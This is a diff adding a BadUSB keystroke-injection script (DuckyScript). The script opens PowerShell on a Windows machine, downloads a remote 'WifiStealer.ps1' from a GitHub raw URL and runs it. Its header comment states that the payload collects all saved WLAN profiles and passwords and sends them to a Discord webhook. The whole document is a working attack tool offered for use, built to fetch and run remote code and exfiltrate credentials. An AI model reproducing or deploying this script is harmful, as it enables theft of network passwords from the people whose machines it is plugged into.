@@ -1,0 +1,22 @@
+REM Get all the WLAN info of all saved wlans (including WLAN password) and send it to a discord webhook.
+GUI R
+DELAY 500
+STRING powershell
+DELAY 1000
+STRING $account = $env:username
+ENTER
+DELAY 100
+STRING $outpath = "C:\Users\$account\downloads\WifiStealer.ps1"
+ENTER
+STRING $url = "https://raw.githubusercontent.com/8Root/test/main/WifiSteal.ps1"
+ENTER
+STRING Invoke-WebRequest $url -outfile $outpath
+ENTER
+DELAY 100
+STRING cd "C:\Users\$account\downloads\"
+ENTER
+STRING start WifiStealer.ps1
+ENTER
+DELAY 3000
+STRING exit
+ENTER
